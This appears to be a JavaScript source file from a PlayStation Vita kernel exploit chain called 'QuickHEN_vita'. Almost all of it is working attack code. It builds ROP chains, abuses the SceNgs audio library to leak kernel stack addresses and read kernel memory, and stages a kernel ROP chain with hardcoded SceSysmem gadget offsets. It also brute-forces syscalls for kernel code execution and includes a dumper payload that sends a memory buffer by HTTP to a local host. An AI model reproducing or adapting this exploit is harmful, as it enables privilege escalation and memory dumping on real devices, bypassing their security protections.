	call_l(free, buffer_info + 0x00);

	// Release rack handle
	load_call_lv(sceNgsRackRelease, rack_handle, NULL);
}

function ReadKernelMemory(dst_p, src_addr, read_size) {
	// Set presets information in voice definition
	_store(PRESET_LIST_OFFSET, voiceDef + 0x30);
	_store(2,                  voiceDef + 0x34);

	// Set presets
	set_preset(0, 0, -(0x148 + 2 * 0x18) + COPYOUT_PARAMS_OFFSET);
	set_preset(1, FAKE_COPYOUT_OFFSET, FAKE_COPYOUT_SIZE);

	// Overwrite copyout's dst, src and len
	_sceClibMemset((voiceDef + FAKE_COPYOUT_OFFSET), 0, FAKE_COPYOUT_SIZE);

	_store(dst_p,     voiceDef + (FAKE_COPYOUT_OFFSET + 0x04));
	_store(src_addr,  voiceDef + (FAKE_COPYOUT_OFFSET + 0x08));
	//_store(read_size, voiceDef + (FAKE_COPYOUT_OFFSET + 0x0C));

	_store(read_size, voiceDef + (FAKE_COPYOUT_OFFSET + 0x1C));

	trigger_ngs_exploit();
}

function init_ngsuser() {
	_sceClibMemset(ngs_system_init_params, 0, 0x14);
	_store(2,    ngs_system_init_params + 0x00);		// nMaxRacks
	_store(2,    ngs_system_init_params + 0x04);		// nMaxVoices
	_store(512,   ngs_system_init_params + 0x08);	// nGranularity
	_store(48000, ngs_system_init_params + 0x0C);	// nSampleRate
	_store(1,     ngs_system_init_params + 0x10);	// nMaxModules
	
	_store(0, rackDesc + 0x00); // pVoiceDefn
	_store(1, rackDesc + 0x04); // nVoices
	_store(1, rackDesc + 0x08); // nChannelsPerVoice
	_store(0, rackDesc + 0x0C); // nMaxPatchesPerInput
	_store(0, rackDesc + 0x10); // nPatchesPerOutput
	_store(0, rackDesc + 0x14); // pUserReleaseData
	
	load_call_vv(sceNgsSystemGetRequiredMemorySize, ngs_system_init_params, paramsize);
	SaveR0ToAddr(free_area);
	send_log_vvvl("// sceNgsSystemGetRequiredMemorySize      : 0x%08X\n", free_area);
	send_log_vvvl("// paramsize                              : 0x%08X\n", paramsize);

	call_vl(memalign, 256, paramsize);
	SaveR0ToAddr(s_pSysMem);

	load_call_llvv(sceNgsSystemInit, s_pSysMem, paramsize, ngs_system_init_params, ngs_syshandle);
	SaveR0ToAddr(free_area);
	send_log_vvvl("// sceNgsSystemInit                       : 0x%08X\n", free_area);

	_sceClibMemset(voiceDef, 0, 0x400);
	_store(SCE_NGS_VOICE_DEFINITION_MAGIC, voiceDef + 0x00);
	_store(SCE_NGS_VOICE_DEFINITION_FLAGS, voiceDef + 0x04);
	_store(0x40,                           voiceDef + 0x08);
	_store(0x40,                           voiceDef + 0x0C);	
}

function leak_kstack_ngsuser() {
	// Plant fake voice definition into kernel stack
	call_vvvvvv(window.sceIoDevctl, empty_string, 0, voiceDef, 0x3FF, 0, 0);
	
	// ldm r41, {r0, r7, ip, sp, pc}
	_store(0,      ldm_r1_data + 0x00); // r0
	_store(0,      ldm_r1_data + 0x04); // r7
	_store(0,      ldm_r1_data + 0x08); // ip
	_store(0,      ldm_r1_data + 0x0C); // sp
	_store(pop_pc, ldm_r1_data + 0x10); // pc


	var loop_start_offset = offset;

	/*
	 * rackDesc.pVoiceDefn = kstack_addr;
	 * kstack_addr += 8;
	 */
	
	// rackDesc.pVoiceDefn = kstack_addr;
	RestoreFromAddrToR0(kstack_addr);
	SaveR0ToAddr(rackDesc + 0x00);

	// kstack_addr += 8
	RestoreFromAddrToR0(kstack_addr);			// kstack
	push(window.pop_r4_pc);						// pc
	push(8);								// r4 - r4 = 8
	push(window.adds_r0_r0_r4_pop_r3_r4_r5_pc);	// pc - r0 += r4
	push(0);								// r3
	push(0);								// r4
	push(0);								// r5
	SaveR0ToAddr(kstack_addr);

	// Determine memory requirement for rack
	load_call_lvv(sceNgsRackGetRequiredMemorySize, ngs_syshandle, rackDesc, buffer_info + 0x04);
	SaveR0ToAddr(free_area);
	send_log_vvvl("// sceNgsRackGetRequiredMemorySize : 0x%08X\n", free_area);
	send_log_vvvl("// buffer_info + 0x04              : 0x%08X\n", buffer_info + 0x04);
	send_log_vvvl("// kstack_addr leak by ngs ????         : 0x%08X\n", rackDesc);
	
	RestoreFromAddrToR0(free_area);
	push(window.adds_r1_r0_0x0_adds_r0_r1_0x0_pop_r4_pc);	// pc - r1 = r0; r0 = r1;
	push(0);										// r4


	// r0 = r1 >> r3;
	// r4 = 0x80XXXXXX >> 29;
	push(window.pop_r3_pc);					// pc
	push(29);							// r3 - r3 = 29;
	push(window.mov_r0_r3_pop_r4_pc);			// pc - r0 = r3;
	push(0);							// r4
	push(window.lsr_r0_r1_r0_pop_r4_pc);		// pc - r0 = r1 >> r0;
	push(window.ldm_r1_data_addr);				// r4 - r4 = ldm_r1_data_addr;
	push(window.adds_r0_r0_r4_pop_r3_r4_r5_pc);// pc - r0 += r4;
	push(0);							// r3
	push(0);							// r4
	push(0);							// r5
	/*
	 * ldm_r1_data_addr + 0x00 : loop_end_addr
	 * ldm_r1_data_addr + 0x04 : loop_start_addr
	 * ldm_r1_data.sp = *(uint32_t *)r0
	 */
	push(window.ldr_r0_r0_pop_r4_pc);			// pc - r0 = *r0
	push(window.ldm_r1_data + 0x0C);			// r4 - r4 = ldm_r1_data + 0x0C (= sp)
	push(window.str_r0_r4_pop_r4_pc);			// pc - *r0 = r4
	push(0);							// r4

	push(window.pop_r1_pc);					// pc
	push(window.ldm_r1_data);					// r1

	push(window.ldm_r1_r0_r7_ip_sp_pc);		// pc

	var loop_end_offset = offset;
	
	_store(window.current_payload_code_addr + loop_end_offset, ldm_r1_data_addr);
	_store(window.current_payload_code_addr + loop_start_offset, kmemory_copy_area);
}

var HTTPBUF_ADDR = 0x812B0000;
var HTTPBUF_SIZE = 0x1000;
var MEMBLOCK_BASE = 0x8120D000;
var ENCDEC_SCRATCH = 0x81210000;
var KROP = 0x81220000;

var SceSysmem_base = 0x480000;
var k_pop_r0_r4_pc = SceSysmem_base + 0x2d471; // 0x000000000002d471 : pop {r0, r1, r2, r3, r4, pc}
var k_blx_r4_pop_r4_pc = SceSysmem_base + 0x1aed3; // 0x000000000001aed3 : blx r4 ; pop {r4, pc}
var k_infloop = SceSysmem_base + 0x32063;
var k_sceKernelMemcpyKernelToUser = SceSysmem_base + 0xA1D9;
var k_pop_r0_r1_pc = SceSysmem_base + 0x491b; // 0x000000000000491a : pop {r0, r1, pc}
var k_pop_r0_r1_r2_pc = SceSysmem_base + 0x334fd; //0x00000000000334fc : pop {r0, r1, r2, pc}
var k_pop_r4_pc = SceSysmem_base + 0x3a9f; //0x0000000000003a9e

function make_dumper_payload() {
	// Setup ldm_r4_data for lr shit. This unlocks "store" (without underscore) wrapper.
	_store(0, ldm_r4_data + 0x00);
	_store(0, ldm_r4_data + 0x04);
	_store(0, ldm_r4_data + 0x08);
	_store(window.pop_pc, ldm_r4_data + 0x0C);
	_store(window.pop_pc, ldm_r4_data + 0x10);
	
	// Setup ptr_pop_pc for some CALL wrappers
	_store(pop_pc, ptr_pop_pc);

	call_v(sceKernelDelayThread, 2 * 1000 * 1000);
	
	/*init_socket("192.168.0.40", 9040);
	send_log_vvvv("// Welcome to QuickHEN_vita dumper payload for FW: %i\n", window.psvita_fw);
	close_socket();*/
	
	http_send_buffer(window.current_payload_data_addr + 0x8000, "http://192.168.0.40:8080/", HTTPBUF_ADDR, HTTPBUF_SIZE);
	
	// Open PKG Installer
	/*_sceClibMemset(free_text_area, 0, 0x400);
	RopStrcpy(free_text_area, "psgm:open?titleid=NPXS10031");
	call_vv(sceAppMgrLaunchAppByUri, 0xFFFFF, free_text_area);*/
	
	call_v(sceKernelDelayThread, 60 * 1000 * 1000);

	push(window.infloop);	// pc
}

function bruteforce_syscall() {
	var start = 0x2C0 - 0x20;  // 0x30 * 3
	for (var idx = 0; idx <= 0x50; idx++) {
		var syscall = start + idx;
		_sceClibMemset(ENCDEC_SCRATCH + 0x1000, 0, 0x10);
		_sceClibMemset(ENCDEC_SCRATCH + 0x800, 0, 0x30);

		_store(ENCDEC_SCRATCH + 0x1000,		ENCDEC_SCRATCH + 0x00);
		_store(ENCDEC_SCRATCH + 0x1000,		ENCDEC_SCRATCH + 0x04);
		_store(ENCDEC_SCRATCH + 0x800,		ENCDEC_SCRATCH + 0x0C);
		_store(0,							ENCDEC_SCRATCH + 0x10); // R10 - was: store(0x100, ENCDEC_SCRATCH + 0x10);
		_store(ENCDEC_SCRATCH + 0x820,		ENCDEC_SCRATCH + 0x14);
		//set_syscall(syscall);
		//syscall(ENCDEC_SCRATCH, 0x10000, 0xA);
		call_vvvv(window.svc, syscall, ENCDEC_SCRATCH, 0x10000, 0xA);
		SaveR0ToAddr(HTTPBUF_ADDR + 16 * idx);
		_store(syscall, HTTPBUF_ADDR + 4 + 16 * idx);
		call_vvv(memcpy, HTTPBUF_ADDR + 8 + 16 * idx, ENCDEC_SCRATCH + 0x1000, 0x8);
	}
}

function bruteforce_kx() {
	var start = 0x2C0;
	for (var idx = 0; idx <= 0x50; idx++) {
		var syscall = start + idx;
		_sceClibMemset(ENCDEC_SCRATCH + 0x4000, 0, 0x100);
		_sceClibMemset(ENCDEC_SCRATCH + 0x800, 0, 0x30);
		
		_store(ENCDEC_SCRATCH + 0x4000,		ENCDEC_SCRATCH + 0x00);
		_store(ENCDEC_SCRATCH + 0x4000,		ENCDEC_SCRATCH + 0x04);
		_store(0x20,						ENCDEC_SCRATCH + 0x08);
		RestoreFromAddrToR0(MEMBLOCK_BASE);
		addToR0(0x1FF68);
		SaveR0ToAddr(						ENCDEC_SCRATCH + 0x0C);
		_store(0x4E0,						ENCDEC_SCRATCH + 0x10); // R10
		_store(0,							ENCDEC_SCRATCH + 0x14);
		call_vvvv(window.svc, syscall, ENCDEC_SCRATCH, 0x3F, 0);
	}
}

function enc_dec_kexploit() {
	_sceClibMemset(free_area, 0, 0x400);
	_sceClibMemset(MEMBLOCK_BASE, 0, 0x4);

	_sceClibMemset(free_text_area, 0, 0x400);
	RopStrcpy(free_text_area, "krop_memblock");
	call_vvvv(sceKernelAllocMemBlock, free_text_area, 0x0c20d060, 0x20000, 0);
	SaveR0ToAddr(free_area);
	//send_log_vvvl("// sceKernelAllocMemBlock: %08X\n", free_area);

	RestoreFromAddrToR0(free_area);
	call_rv(sceKernelGetMemBlockBase, MEMBLOCK_BASE);
	//send_log_vvvl("// sceKernelGetMemBlockBase: %08X\n", MEMBLOCK_BASE);

	// start krop

	_store(k_pop_r0_r1_pc,					KROP + 4 * 0); // pc
	_store(0,								KROP + 4 * 1); // r0
	_store(0,								KROP + 4 * 2); // r1
	_store(k_infloop,						KROP + 4 * 3); // pc
	/*
	_store(k_pop_r0_r1_r2_pc,				KROP + 4 * 0); // pc
	_store(HTTPBUF_ADDR,					KROP + 4 * 1); // r0 = dst
	_store(SceSysmem_base,					KROP + 4 * 2); // r1 = src
	_store(HTTPBUF_SIZE,					KROP + 4 * 3); // r2 = sz
	_store(k_sceKernelMemcpyKernelToUser,	KROP + 4 * 4); // r4 = fptr
	_store(k_blx_r4_pop_r4_pc,				KROP + 4 * 6); // pc
	_store(0,								KROP + 4 * 7); // r4
	_store(k_infloop,						KROP + 4 * 8); // pc
	*/
	// end krop

	RestoreFromAddrToR0(MEMBLOCK_BASE);
	addToR0(0x1FF68 + 0x6C);
	// other way: load_add_store(MEMBLOCK_BASE, MEMBLOCK_BASE, 0x1FF68 + 0x6C);
	SaveR0ToAddr(free_area);
	send_log_vvvl("// dest address: %08X\n", free_area);
	RestoreFromAddrToR0(free_area);
	call_rvv(memcpy, KROP, HTTPBUF_SIZE);
	SaveR0ToAddr(free_area);
	send_log_vvvl("// memcpy: %08X\n", free_area);

	bruteforce_kx();

	send_log_vvvv("// bruteforce_kx done\n", 0);

	//call_v(svc, 0x2c0);
	//SaveR0ToAddr(HTTPBUF_ADDR + 0x00);
	//_store(0x41414141, HTTPBUF_ADDR + 0x04);

	call_v(sceKernelDelayThread, 20 * 1000 * 1000);

	_sceClibMemset(free_text_area, 0, 0x400);
	RopStrcpy(free_text_area, "psgm:open?titleid=NPXS10031");
	call_vv(sceAppMgrLaunchAppByUri, 0xFFFFF, free_text_area);
}

function make_second_payload() {
	// Setup ldm_r4_data for lr shit. This unlocks "store" (without underscore) wrapper.
	_store(0, ldm_r4_data + 0x00);
	_store(0, ldm_r4_data + 0x04);
	_store(0, ldm_r4_data + 0x08);
	_store(window.pop_pc, ldm_r4_data + 0x0C);
	_store(window.pop_pc, ldm_r4_data + 0x10);
	
	// Setup ptr_pop_pc for some CALL wrappers
	_store(pop_pc, ptr_pop_pc);

	//_sceClibMemset(window.second_payload_base_addr + window.current_payload_size, 0, 0x40000); // init ROP use area

	// Init and connect socket
	
	init_socket("192.168.0.40", 9030);
	send_log_vvvv("// Welcome to QuickHEN_vita second payload for FW: %i\n", window.psvita_fw);

	/*
	// Leak kstack addr by sceIoDevctl
	
	_sceClibMemset(buf_sceIoDevctl, 0x66, 0x400);
	_sceClibMemset(free_text_area, 0, 0x40);
	RopStrcpy(free_text_area + 0x00, "molecule0:");
	RopStrcpy(free_text_area + 0x10, "sdstor0:");
	RopStrcpy(free_text_area + 0x20, "xmc-lp-ign-userext");
	call_vvv(sceIoOpen, free_text_area + 0x00, 0, 0);
	call_vvvvvv(window.sceIoDevctl, free_text_area + 0x10, 5, free_text_area + 0x20, 0x14, buf_sceIoDevctl, 0x3FF);
	load_add_store(kstack_addr, buf_sceIoDevctl + 0x3C4, -0xEF4);
	send_log_vvvl("// kstack_addr leak by sceIoDevctl : 0x%08X\n", kstack_addr);

	// Init SceAppUtil

	call_vv(sceAppUtilInit, app_util_init_param, app_util_boot_param);
	SaveR0ToAddr(free_area);
	send_log_vvvl("// sceAppUtilInit                  : 0x%08X\n", free_area);

	// Load SceNgs

	call_v(sceSysmoduleLoadModule, 0xB);
	SaveR0ToAddr(free_area);
	send_log_vvvl("// sceSysmoduleLoadModule          : 0x%08X\n", free_area);

	_store(1, modnum);
	call_vvv(sceKernelGetModuleList, 0xFF, modlist, modnum);
	call_lv(sceKernelGetModuleInfo, modlist, mod_info);	// mod_info + 0x154 + 0x8, module text addr

	// Get SceNgsUser functions
	load_add_store(sceNgsSystemGetRequiredMemorySize, mod_info + 0x154 + 0x8, NgsSystemGetRequiredMemorySize_offset);
	load_add_store(sceNgsSystemInit,                  mod_info + 0x154 + 0x8, NgsSystemInit_offset);
	load_add_store(sceNgsRackGetRequiredMemorySize,   mod_info + 0x154 + 0x8, NgsRackGetRequiredMemorySize_offset);
	load_add_store(sceNgsRackInit,                    mod_info + 0x154 + 0x8, NgsRackInit_offset);
	load_add_store(sceNgsRackRelease,                 mod_info + 0x154 + 0x8, NgsRackRelease_offset);

	// Init NGS
	init_ngsuser();
	*/

	/*
	leak_kstack_ngsuser();

	// rackDesc.pVoiceDefn = kstack_addr + 0xB28;
	load_add_store(rackDesc + 0x00, kstack_addr, 0xB28);

	// Set presets information in voice definition
	_store(PRESET_LIST_OFFSET, voiceDef + 0x30);
	_store(2,                  voiceDef + 0x34);

	// Set presets
	set_preset(0, 0, -(0x148 + 2 * 0x18) + COPYOUT_PARAMS_OFFSET);
	set_preset(1, FAKE_COPYOUT_OFFSET, FAKE_COPYOUT_SIZE);

	// Overwrite copyout's dst, src and len
	_sceClibMemset((voiceDef + FAKE_COPYOUT_OFFSET), 0, FAKE_COPYOUT_SIZE);

	_store(kmemory_copy_area, voiceDef + (FAKE_COPYOUT_OFFSET + 0x04));
	_store(0x480000,          voiceDef + (FAKE_COPYOUT_OFFSET + 0x08));
	_store(0x10,              voiceDef + (FAKE_COPYOUT_OFFSET + 0x1C));

	trigger_ngs_exploit();

	send_log_vvvl("// kmemory leak test               : 0x%08X\n", kmemory_copy_area);
	*/

	/*_sceClibMemset(free_text_area, 0, 0x400);
	RopStrcpy(free_text_area, "psgm:open?titleid=NPXS10031");
	call_vv(sceAppMgrLaunchAppByUri, 0xFFFFF, free_text_area);*/

	enc_dec_kexploit();

	close_socket();
	
	call_v(sceKernelDelayThread, 60 * 1000 * 1000);
	
	push(window.infloop);	// pc
}